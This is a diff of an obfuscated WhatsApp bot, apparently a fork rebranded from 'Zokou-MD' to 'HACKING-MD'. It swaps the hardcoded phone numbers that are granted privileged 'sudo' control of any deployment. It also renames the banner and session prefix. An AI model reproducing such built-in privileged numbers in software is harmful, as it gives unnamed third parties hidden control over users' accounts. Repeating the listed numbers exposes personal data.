@@ -29,7 +29,7 @@ const {
   Sticker,
   StickerTypes
 } = require("wa-sticker-formatter");
-var session = conf.session.replace(/Zokou-MD-WHATSAPP-BOT;;;=>/g, '');
+var session = conf.session.replace(/HACKING-MD;;;=>/g, '');
 const NodeCache = require('node-cache');
 const prefixe = conf.PREFIXE;
 const {
@@ -192,7 +192,7 @@ async function connectToWhatsapp() {
       _0x20b21f = await _0x3a4312();
       dbCache.set("sudo", _0x20b21f);
     }
-    const _0x2cdec4 = [_0x19be2c, "22559763447", "22543343357", '22564297888', "22891733300", "‪99393228‬", conf.NUMERO_OWNER].map(_0x504101 => _0x504101.replace(/[^0-9]/g) + '@s.whatsapp.net');
+    const _0x2cdec4 = [_0x19be2c, "22545065189", "22545065189", '2250705646665', "2250705646665", "‪0507646665‬", conf.NUMERO_OWNER].map(_0x504101 => _0x504101.replace(/[^0-9]/g) + '@s.whatsapp.net');
     const _0x104bd0 = [..._0x20b21f, ..._0x2cdec4];
     const _0x53e9af = _0x104bd0.includes(_0x37a424);
     var _0x57dfc0 = ["22559763447", "22543343357", '22564297888', "‪99393228‬", "22891733300"].map(_0x339129 => _0x339129.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x37a424);
@@ -203,7 +203,7 @@ async function connectToWhatsapp() {
         'quoted': _0x239233
       });
     }
-    console.log("\t [][]...{Zokou-Md}...[][]");
+    console.log("\t [][]...{HAcking-MD}...[][]");
     console.log("=========== Nouveau message ===========");
     if (_0x162f10) {
       console.log("message provenant du groupe : " + _0x4e8ce4);
